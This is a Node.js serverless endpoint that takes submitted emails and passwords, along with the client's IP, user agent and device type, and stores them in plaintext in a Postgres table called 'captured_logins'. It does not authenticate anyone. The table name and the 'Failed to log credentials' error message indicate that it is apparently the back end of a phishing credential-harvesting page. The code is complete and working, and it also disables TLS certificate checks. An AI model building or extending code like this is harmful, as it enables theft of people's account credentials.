const { Pool } = require('pg');

// Create pool with better configuration
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: {
    rejectUnauthorized: false
  },
  connectionTimeoutMillis: 5000,
  idleTimeoutMillis: 30000,
  max: 20
});

module.exports = async function handler(req, res) {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  console.log('📥 Received credentials request');
  
  const { email, password, userAgent } = req.body;
  
  if (!email || !password) {
    console.log('❌ Missing email or password');
    return res.status(400).json({ error: 'Email and password required' });
  }

  // Get client IP
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'unknown';

  try {
    console.log('🔗 Attempting database connection...');
    console.log('Database URL exists:', !!process.env.DATABASE_URL);
    
    const client = await pool.connect();
    console.log('✅ Database connected successfully');

    // Validate format for our records
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const phoneRegex = /^\d{10}$/;
    const cleanEmail = email.replace(/\D/g, '');
    const isValidFormat = emailRegex.test(email) || phoneRegex.test(cleanEmail);
    
    // Detect device type
    const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent || '');
    const deviceType = isMobile ? 'mobile' : 'desktop';

    console.log('📝 Inserting data:', { 
      email: email.substring(0, 3) + '***', 
      password: password.substring(0, 2) + '***',
      deviceType 
    });

    const result = await client.query(
      `INSERT INTO captured_logins 
       (email, password, user_agent, ip_address, is_valid_format, device_type) 
       VALUES ($1, $2, $3, $4, $5, $6) 
       RETURNING id`,
      [email, password, userAgent, ip, isValidFormat, deviceType]
    );
    
    await client.release();
    
    console.log('✅ Data inserted successfully. ID:', result.rows[0].id);
    
    res.status(200).json({ 
      success: true, 
      deviceType,
      insertedId: result.rows[0].id 
    });
    
  } catch (error) {
    console.error('❌ Database error:', error);
    
    // More detailed error logging
    if (error.code) {
      console.error('Error code:', error.code);
      console.error('Error detail:', error.detail);
      console.error('Error hint:', error.hint);
    }
    
    res.status(500).json({ 
      error: 'Failed to log credentials',
      details: error.message 
    });
  }
}
